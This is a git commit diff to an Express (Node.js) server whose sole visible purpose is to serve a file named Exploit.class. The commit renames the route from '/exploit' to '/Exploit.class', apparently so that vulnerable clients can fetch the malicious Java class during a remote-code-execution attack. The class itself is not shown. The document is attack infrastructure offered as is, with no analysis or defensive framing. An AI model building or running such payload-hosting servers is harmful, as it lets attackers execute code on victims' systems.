81a0ac5dbf65ffa0caeae3dc272ab3fcf299b9cd
Nevar <gienek.eu.pl@gmail.com>
2021-12-11 19:40:28 +0100

    Update index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@ const PORT = process.env.PORT || 5000
 express()
 	.set('exploit', path.join(__dirname, 'Exploit.class'))
 	.set('view engine', 'ejs')
-	.get('/exploit', function (req, res) {
+	.get('/Exploit.class', function (req, res) {
 		res.sendFile("Exploit.class", {root: path.join(__dirname)}, function (err) {
 			if (err) {console.log(err)} 
 			else {console.log("Sent file!")} 
